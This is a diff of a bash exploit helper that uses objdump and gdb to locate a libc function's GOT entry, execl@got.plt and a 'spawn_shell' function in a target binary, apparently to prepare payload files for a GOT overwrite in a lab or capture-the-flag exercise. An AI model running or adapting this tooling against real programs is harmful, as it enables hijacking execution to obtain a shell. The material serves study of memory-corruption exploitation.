@@ -16,6 +16,7 @@ bufbound=$3
 dat1="data1.dat"
 dat2="data2.dat"
 execfn="execl"
+spawnfn="spawn_shell"
 
 # Find address of libc library function to be overwritten
 libaddrline=(`objdump --dynamic-reloc $binname | grep $libfn`)
@@ -33,10 +34,16 @@ execloc=(`gdb $binname < comms1 | grep "<$execfn@got\.plt>"`)
 execloc=(`echo ${execloc[3]} | cut -f2 -d "x"`)
 echo "Location of $execfn@got.plt: 0x$execloc"
 
-# Find address of spawn_shell
-echo -n "p spawn_shell" > comms2
+# Find address of shell-spawning function
+echo -n "p $spawnfn" > comms2
 spawnaddrline=(`gdb $binname < comms2 | grep "0x[0-9a-fA-F]\{6,8\}"`)
-spawnaddr=(`echo ${spawnaddrline[8]} | tr 'x' '0'`)
+salindex=0
+for i in "${!spawnaddrline[@]}"; do
+	if [[ ${spawnaddrline[$i]} == "<$spawnfn>" ]]; then
+		let salindex="$i-1"
+	fi
+done
+spawnaddr=(`echo ${spawnaddrline[$salindex]} | tr 'x' '0'`)
 echo "Address of spawn_shell(): $spawnaddr"
 
 # Write first payload file
